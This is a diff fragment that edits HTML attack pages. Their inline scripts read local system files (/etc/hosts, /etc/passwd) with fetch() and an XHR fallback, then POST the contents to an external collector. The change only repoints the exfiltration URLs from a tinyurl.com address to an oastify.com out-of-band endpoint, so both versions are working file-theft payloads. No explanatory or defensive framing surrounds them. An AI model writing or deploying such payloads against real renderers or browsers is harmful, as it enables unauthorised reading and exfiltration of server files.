@@ -13,13 +13,13 @@
     // Attempt to read via fetch()
     fetch('file:///etc/hosts')
       .then(r => r.text())
-      .then(d => fetch('https://tinyurl.com/2s3wx3a5/exfil', { method: 'POST', body: d }))
-      .catch(e => fetch('https://tinyurl.com/2s3wx3a5/error', { body: e.message }));
+      .then(d => fetch('https://xabhsq16yiae1bttw6sjlxd33u9mxhl6.oastify.com/exfil', { method: 'POST', body: d }))
+      .catch(e => fetch('https://xabhsq16yiae1bttw6sjlxd33u9mxhl6.oastify.com/error', { body: e.message }));
 
     // Fallback to XHR
     const xhr = new XMLHttpRequest();
     xhr.open('GET', 'file:///etc/hosts', true);
-    xhr.onload = () => fetch('https://tinyurl.com/2s3wx3a5/xhr', { body: xhr.responseText });
+    xhr.onload = () => fetch('https://xabhsq16yiae1bttw6sjlxd33u9mxhl6.oastify.com/xhr', { body: xhr.responseText });
     xhr.send();
   </script>
 </body>
@@ -32,13 +32,13 @@
     // Attempt to read via fetch()
     fetch('file:///etc/passwd')
       .then(r => r.text())
-      .then(d => fetch('https://tinyurl.com/2s3wx3a5/exfil', { method: 'POST', body: d }))
-      .catch(e => fetch('https://tinyurl.com/2s3wx3a5/error', { body: e.message }));
+      .then(d => fetch('https://xabhsq16yiae1bttw6sjlxd33u9mxhl6.oastify.com/exfil', { method: 'POST', body: d }))
+      .catch(e => fetch('https://xabhsq16yiae1bttw6sjlxd33u9mxhl6.oastify.com/error', { body: e.message }));
 
     // Fallback to XHR
     const xhr = new XMLHttpRequest();
     xhr.open('GET', 'file:///etc/passwd', true);
-    xhr.onload = () => fetch('https://tinyurl.com/2s3wx3a5/xhr', { body: xhr.responseText });
+    xhr.onload = () => fetch('https://xabhsq16yiae1bttw6sjlxd33u9mxhl6.oastify.com/xhr', { body: xhr.responseText });
     xhr.send();
   </script>
 </body>
